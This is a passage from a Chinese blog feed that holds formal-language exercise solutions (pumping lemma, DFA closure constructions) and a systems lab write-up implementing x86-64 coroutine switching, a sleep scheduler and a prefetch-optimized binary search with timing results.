href="#Ex-4-1-2-f" class="headerlink" title="Ex 4.1.2 (f)"></a>Ex 4.1.2 (f)</h3><p>​    对于任意的 $n \ge 1$, 存在 $\omega = 0^n110^n\in\left\{ww^R\mid w\in{0, 1}^{*}\right\}$.</p><p>​    考虑任意 $x, y, z$ 满足 $\omega = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    <script type="math/tex">xy^2z = 0^{n + i}110^n\notin\left\{ww\mid w\in{0, 1}^{*}\right\}.</script></p><p>​    因此 $\omega$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-2-1-d"><a href="#Ex-4-2-1-d" class="headerlink" title="Ex 4.2.1 (d)"></a>Ex 4.2.1 (d)</h3><p>​    注意到 $L = {0, 12}$,</p><p>​    那么 $h(L) = {h(0), h(12)} = {a, abba}$.</p><h3 id="Ex-4-2-2"><a href="#Ex-4-2-2" class="headerlink" title="Ex 4.2.2"></a>Ex 4.2.2</h3><p>​    考虑一个与正则语言 $L$ 等价的 $DFA$:</p><p>​    <script type="math/tex">A = \left\{Q, \Sigma, \delta, q, F_A\right\}.</script></p><p>​    我们构造</p><p>​    <script type="math/tex">B = \left\{Q, \Sigma, \delta, q, F_B\right\}.</script></p><p>​    其中</p><p>​    <script type="math/tex">q_0\in F_B\Longleftrightarrow\delta(q_0, a)\in F_A.</script></p><p>​    那么容易得到 $B$ 接受字符串 $w$ 当且仅当 $A$ 接受字符串 $wa$.</p><p>​    也即 $DFA$ 与语言 $L/a$ 等价, $L/a$ 为正则语言.</p><h3 id="Ex-4-2-3"><a href="#Ex-4-2-3" class="headerlink" title="Ex 4.2.3"></a>Ex 4.2.3</h3><p>​    注意到</p><p>​    <script type="math/tex">a/L=(L^R/a)^R,</script></p><p>​    又因为正规语言的商运算和反向运算都是封闭的, </p><p>​    因此若 $L$ 是正则语言, 那么 $L/a$ 是正则语言, 进而 $a/L$ 是正则语言.</p><h3 id="Ex-4-2-8"><a href="#Ex-4-2-8" class="headerlink" title="Ex 4.2.8"></a>Ex 4.2.8</h3><p>​    考虑一个与正则语言 $L$ 等价的 $DFA$:</p><p>​    <script type="math/tex">A = \left\{Q, \Sigma, \delta, q_0, F\right\}.</script></p><p>​    我们构造一个 $DFA$</p><p>​    <script type="math/tex">B = \left\{Q', \Sigma, \delta', q_0', F'\right\}.</script></p><p>​    其中</p><p>​    <script type="math/tex">Q' = \{[q, S]\mid q\in Q, S\subseteq Q, \mbox{若 $q_0$ 到 $q$ 的路径长 $l$},</script><br>​    <script type="math/tex">\mbox{则}\thinspace p\in S\Longleftrightarrow \mbox{存在长 $l$ 的从 $p$ 到某个终态的路径}.\}</script><br>​    <script type="math/tex">q_0' = [q_0, F].</script><br>​    <script type="math/tex">F' = \left\{[q, S]\mid q\in S\right\}</script></p><p>​    下面定义转移函数 $\delta’$:</p><p>​    <script type="math/tex">\delta'([q, S], a) = [\delta(q, a), T],</script></p><p>​    其中</p><p>​    <script type="math/tex">t\in T\Longleftrightarrow \exists\thinspace s\in S, \mbox{使}\thinspace t \thinspace\mbox{到}\thinspace s \thinspace\mbox{有一条转移边}.</script></p><p>​    易得这个 $DFA B$ 与我们定义的 $half(L)$ 等价, </p><p>​    故若 $L$ 为正则语言, 那么 $half(L)$ 亦为正则语言.</p><h3 id="Ex-4-2-13-a"><a href="#Ex-4-2-13-a" class="headerlink" title="Ex 4.2.13 (a)"></a>Ex 4.2.13 (a)</h3><p>​    注意到</p><p>​    <script type="math/tex">\left\{0^i1^j\mid i\ne j\right\} = \left\{0, 1\right\}^{*} - \left\{0^n1^n\mid n\ge 0\right\}.</script></p><p>​    若 $\left\{0^i1^j\mid i\ne j\right\}$ 为正规语言, </p><p>​    由于正规语言的闭包运算、补运算都是封闭的,</p><p>​    可得 $L_{0n1n} = \left\{0^n1^n\mid n\ge 0\right\}$ 也是正规语言, 这与已知矛盾.</p><p>​    因此 $\left\{0^i1^j\mid i\ne j\right\}$ 非正规语言.</p><h3 id="Ex-4-2-13-b"><a href="#Ex-4-2-13-b" class="headerlink" title="Ex 4.2.13 (b)"></a>Ex 4.2.13 (b)</h3><p>​    考虑映射</p><p>​    <script type="math/tex">h: \left\{0, 1, 2\right\}^{*}\Longrightarrow\left\{0, 1\right\}^{*},</script></p><p>​    其中</p><p>​    <script type="math/tex">h(0) = 0, h(1) = h(2) = 1.</script></p><p>​    从而</p><p>​    <script type="math/tex">h(\left\{0^n1^m2^{n - m}\mid n\ge m\ge 0\right\}) = \left\{0^n1^n\mid n\ge 0\right\} = L_{0n1n}.</script></p><p>​    由于正规语言的同态运算具有封闭性, 且 $L_{0n1n}$ 非正规语言,</p><p>​    从而 $\left\{0^n1^m2^{n - m}\mid n\ge m\ge 0\right\}$ 非正规语言.</p><h3 id="Ex-4-3-4"><a href="#Ex-4-3-4" class="headerlink" title="Ex 4.3.4"></a>Ex 4.3.4</h3><p>​    设 $DFA$</p><p>​    <script type="math/tex">A_1 = (Q_1, \Sigma, \delta_1, q_1, F_1),</script></p><p>​    和 $DFA$</p><p>​    <script type="math/tex">A_2 = (Q_2, \Sigma, \delta_2, q_2, F_2).</script></p><p>​    的语言分别为 $L_1$ 和 $L_2$, 我们构造 $DFA$</p><p>​    <script type="math/tex">A = (Q_1 \times Q_2 , \Sigma, \delta, \left<q_1, q_2\right> , F_1 \times F_2),</script></p><p>​    其中</p><p>​    <script type="math/tex">\delta(\left<p, q\right>, a)= \left<\delta_1(p, a), \delta_2(q, a)\right>.</script> </p><p>​    那么 $L(A)= L_1\cap L_2$, 只需判定该 $A$ 中从初态是否可达某一终态即可. </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 1</title>
      <link href="/2022/11/04/ji-suan-ji-xi-tong-gai-lun-lab-1/"/>
      <url>/2022/11/04/ji-suan-ji-xi-tong-gai-lun-lab-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Task-1-协程库的编写"><a href="#Task-1-协程库的编写" class="headerlink" title="Task 1: 协程库的编写"></a>Task 1: 协程库的编写</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># lib/context.S.global coroutine_switchcoroutine_switch:    # 保存栈顶地址到 %rdi 指向的上下文    movq %rsp, 64(%rdi)    # 保存 callee-saved 寄存器到 %rdi 指向的上下文    movq %rbx, 72(%rdi)    movq %rbp, 80(%rdi)    movq %r12, 88(%rdi)    movq %r13, 96(%rdi)    movq %r14, 104(%rdi)    movq %r15, 112(%rdi)    # 利用 rip 相对寻址使 rip 指向 ret 指令的地址 (.coroutine_ret)    leaq .coroutine_ret(%rip), %rax    movq %rax, 120(%rdi)    # 从 %rsi 指向的上下文恢复栈顶地址    movq 64(%rsi), %rsp    # 从 %rsi 指向的上下文恢复 callee-saved 寄存器    movq 72(%rsi), %rbx    movq 80(%rsi), %rbp    movq 88(%rsi), %r12    movq 96(%rsi), %r13    movq 104(%rsi), %r14    movq 112(%rsi), %r15    # jmpq 到上下文保存的 rip    jmpq *120(%rsi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/context.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">bool</span> all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment">// 记录正在执行的协程 id</span>                context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token comment">// 调用 resume() 返回调度器</span>                coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_pool<span class="token operator">-&gt;</span>is_parallel<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 从 g_pool 中获取当前协程状态</span>        <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 调用 coroutine_switch 切换到 coroutine_pool 上下文</span>        <span class="token comment">// 保存 caller-saved 寄存器, 恢复 callee-saved 寄存器</span>        <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/context.h */</span><span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 调用 coroutine_switch</span>    <span class="token comment">// 保存 callee-saved 寄存器, 恢复 callee-saved 寄存器</span>    <span class="token comment">// 将 rip 恢复到协程 yield 后需执行的指令地址</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>caller_registers<span class="token punctuation">,</span> callee_registers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>basic_context</code> 类构造函数在堆上开辟了协程栈 <code>stack</code>, 因为 <code>x86-64</code> 要求运行栈栈帧按照 16 字节对齐, 因此需要将栈顶地址 <code>rsp</code> 低 16 字节置 0, 使其为 16 的倍数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 栈顶地址 rsp</span><span class="token keyword">uint64_t</span> rsp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack<span class="token punctuation">[</span>stack_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 对齐到 16 字节边界</span>rsp <span class="token operator">=</span> rsp <span class="token operator">-</span> <span class="token punctuation">(</span>rsp <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求"><a href="#额外要求" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>执行 <code>coroutine_switch</code> 时栈的变化过程:</strong></p><p><img src="/pic/12.png" alt=""></p><ul><li>调度器通过 <code>resume()</code> 切换至协程内部时, 将 <code>callee registers</code> 保存在 <code>caller_registers[]</code>, 同时从 <code>callee_registers[]</code> 中恢复  <code>callee registers</code>, 并使用 <code>jmpq</code> 返回之前协程的结束地址.</li><li>协程函数通过 <code>yield()</code> 返回至调度器时, 将 <code>callee registers</code> 保存在 <code>callee_registees[]</code>, 同时从 <code>caller_registers[]</code> 中恢复 <code>callee registers</code>, 并使用 <code>jmpq</code> 返回调度器中.</li></ul></li><li><p><strong>协程是如何开始执行的:</strong></p><p>初始化一个协程时, <code>caller_registers</code> 用于保存 <code>coroutine pool</code> 的上下文, <code>callee_registers</code> 用于保存协程函数的上下文, <code>finished</code> 状态置为 <code>false</code>. 协程自身 <code>rip</code> 寄存器设置为 <code>coroutine_entry</code>,  <code>r12</code> 寄存器设置为 <code>coroutine_main</code> 地址, <code>r13</code> 寄存器设置为协程自身地址.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>RSP<span class="token punctuation">]</span> <span class="token operator">=</span> rsp<span class="token punctuation">;</span><span class="token comment">// 协程入口是 coroutine_entry</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>RIP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>coroutine_entry<span class="token punctuation">;</span><span class="token comment">// 设置 r12 寄存器为 coroutine_main 的地址</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>R12<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>coroutine_main<span class="token punctuation">;</span><span class="token comment">// 设置 r13 寄存器，用于 coroutine_main 的参数</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token double-colon punctuation">::</span>R13<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当通过 <code>coroutines[i]-&gt;resume()</code> 进入该协程时,  <code>coroutine_switch</code> 会将 <code>callee_registers</code> 内容读入系统, 此时 <code>%rip</code> 存放了 <code>coroutine_entry</code> 的地址. <code>coroutine_entry</code> 将协程地址作为参数传入 <code>%rax</code> 并调用了 <code>coroutine_main</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.global coroutine_entrycoroutine_entry:    movq %r13, %rdi    callq *%r12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>coroutine_main</code> 通过 <code>context-&gt;run()</code> 运行协程, 在运行完毕后将协程 <code>finished</code> 状态置为 <code>true</code>, 并通过 <code>coroutine_switch</code> 切换回调度器.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">coroutine_main</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">basic_context</span> <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    context<span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token operator">-&gt;</span>finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// unreachable</span>    <span class="token function">assert</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>考虑浮点和向量寄存器的情况:</strong></p><p><code>AMD64</code> 架构中存在 <code>8</code> 个大小 <code>256</code> 位的 <code>Vector Registers</code>: <code>%xmm0</code> - <code>%xmm7</code>, <code>8</code> 个大小 <code>256</code> 位的 <code>Extended Vector Registers</code>: <code>%xmm8</code> - <code>%xmm15</code>, <code>8</code> 个大小 <code>80</code> 位的 <code>Floating Point Registers</code>: <code>%st0</code> - <code>%st7</code>.</p><p>只需在 <code>basic_context</code> 结构体初始化时开辟与 <code>Floating Point Registers</code> 和 <code>Vector Registers</code> 大小相应的 <code>uint64_t</code> 数组, 并在执行 <code>coroutine_switch</code> 时将相应 <code>register</code> 的内容分别 <code>save</code> 与 <code>load</code> 即可.</p></li></ul><h2 id="Task-2-实现-sleep-函数"><a href="#Task-2-实现-sleep-函数" class="headerlink" title="Task 2: 实现 sleep 函数"></a>Task 2: 实现 sleep 函数</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/coroutine_pool.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">bool</span> all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// context 是否 finish</span>            <span class="token comment">// context 是否 ready</span>            <span class="token comment">// 调用ready_func 后 context 是否 ready</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment">// 判断当前协程的 ready 状态</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span>                    <span class="token comment">// 更新 ready 状态</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready <span class="token operator">=</span> coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">ready_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 当前协程为 ready 状态时进入协程</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 更改正在执行的协程 id</span>                    context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                    <span class="token comment">// 调用 resume() 返回调度器</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 从 g_pool 中获取当前协程状态</span>    <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 将协程置为 false</span>    context<span class="token operator">-&gt;</span>ready <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">// 获取当前时间，更新 ready_func</span>    <span class="token comment">// ready_func：检查当前时间，如果已经超时，则返回 true</span>    <span class="token keyword">auto</span> cur <span class="token operator">=</span> <span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 Lambda 表达式注册一个新的 ready_func 函数</span>    <span class="token comment">// 在至少 ms 毫秒之后将协程置为可用状态</span>    context<span class="token operator">-&gt;</span>ready_func <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>cur<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ms<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token keyword">bool</span><span class="token punctuation">{</span> <span class="token keyword">return</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">duration_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>milliseconds<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> cur<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> ms<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 调用 coroutine_switch 实现 yield 协程</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求-1"><a href="#额外要求-1" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>绘制出 <code>sleep_sort</code> 中不同协程的运行情况:</strong></p><p>以输入 <code>1, 3, 4, 5, 2</code> 为例, 不同协程的运行情况如下图所示:</p><p><img src="/pic/13.png" alt=""></p><p>| time/ms | coroutine1 | coroutine2 | coroutine3 | coroutine4 | coroutine5 |<br>| :——-: | :————: | :————: | :————: | :————: | :————: |<br>|    0    |  unready   |  unready   |  unready   |  unready   |  unready   |<br>|    1    |   ready    |  unready   |  unready   |  unready   |  unready   |<br>|    2    |   finish   |  unready   |  unready   |  unready   |   ready    |<br>|    3    |   finish   |   ready    |  unready   |  unready   |   finish   |<br>|    4    |   finish   |   finish   |   ready    |  unready   |   finish   |<br>|    5    |   finish   |   finish   |   finish   |   ready    |   finish   |<br>|    6    |   finish   |   finish   |   finish   |   finish   |   finish   |</p><p>其中每当一个协程状态被更新为 <code>ready</code> 时, 系统会 <code>resume</code> 至该协程, 运行并输出相应结果.</p></li><li><p><strong>设计更加高效的实现方法:</strong></p><ul><li>在进行 <code>parallel_execute_all()</code> 时, 首先将所有协程的 <code>index</code> 依次加入一个 <code>_coroutine</code> 队列, 依次弹出队首 <code>index</code> 并切换至相应的协程. 若从该协程切出时, 协程状态为 <code>unready</code>, 则将其 <code>index</code> 加入一个 <code>_sleep</code> 优先队列; 若从该协程切出时, 协程状态为 <code>ready</code> 且 <code>unfinished</code>, 则将其加入原 <code>_coroutine</code> 队列.</li><li>在每次向 <code>_sleep</code> 加入 <code>index</code> 时为 <code>index</code> 维护一个变量 <code>time</code>, 它记录当前协程调用 <code>sleep(ms)</code> 后可将自身协程状态置为 <code>ready</code> 的时间点, 即 <code>time = ms + passed_time</code>, 其中 <code>passed_time</code> 为调用 <code>parallel_execute_all()</code> 后经过的时间. 以 <code>time</code> 为排序依据将 <code>index</code> 加入 <code>_sleep</code>. </li><li>在 <code>_coroutine</code> 为空队列后, 且时间到达队首元素的 <code>time</code> 时, 弹出 <code>_sleep</code> 队首元素, 更新其 <code>ready</code> 状态并切入相应协程. 通过如此操作可以节省无效轮询的时间占用.</li></ul></li></ul><h2 id="Task-3-利用协程优化二分查找"><a href="#Task-3-利用协程优化二分查找" class="headerlink" title="Task 3: 利用协程优化二分查找"></a>Task 3: 利用协程优化二分查找</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* src/binary_search.cpp */</span><span class="token keyword">void</span> <span class="token function">lookup_coroutine</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint32_t</span> <span class="token operator">*</span>table<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> value<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> <span class="token operator">*</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 使用 __builtin_prefetch 预取容易产生缓存缺失的内存</span>    <span class="token function">__builtin_prefetch</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>table<span class="token punctuation">[</span>probe<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 在协程 IO 期间进行其他函数调用</span>    <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__builtin_prefetch</code> 的三个参数分别为 <code>操作地址</code>、<code>读 \ 写</code>、<code>时间局部性</code>.</p><p>第二个参数为 <code>0</code>, 表示进行内存读取; 第三个参数为 <code>3</code>, 表示被访问的数据具有高时间局部性, 在被访问不久之后非常有可能再次访问.</p><h3 id="额外要求-2"><a href="#额外要求-2" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>测试环境:</strong></p><blockquote><p>Architecture: x86_64</p><p>Model name: Intel(R) Xeon(R) CPU E5-4610 v2 @ 2.30GHz</p><p>CPU MHz: 2294.600</p><p>CPU max MHz: 2700.0000</p><p>CPU min MHz: 1200.0000</p><p>PS: 对每组实验条件均进行了十次测试, 并对耗时取平均值</p></blockquote></li><li><p><strong>测试 <code>Size (l)</code> 的影响因素:</strong></p><p>| Size (l) | naive (per access) / ns | coroutine (per access) / ns |<br>| :———: | :——————————-: | :————————————-: |<br>|    4     |          1.61           |            62.53            |<br>|    8     |          2.53           |            52.37            |<br>|    12    |          3.63           |            50.06            |<br>|    16    |          3.87           |            47.24            |<br>|    20    |          8.27           |            47.71            |<br>|    24    |          28.04          |            46.01            |<br>|    28    |          45.53          |            44.92            |<br>|    32    |          58.99          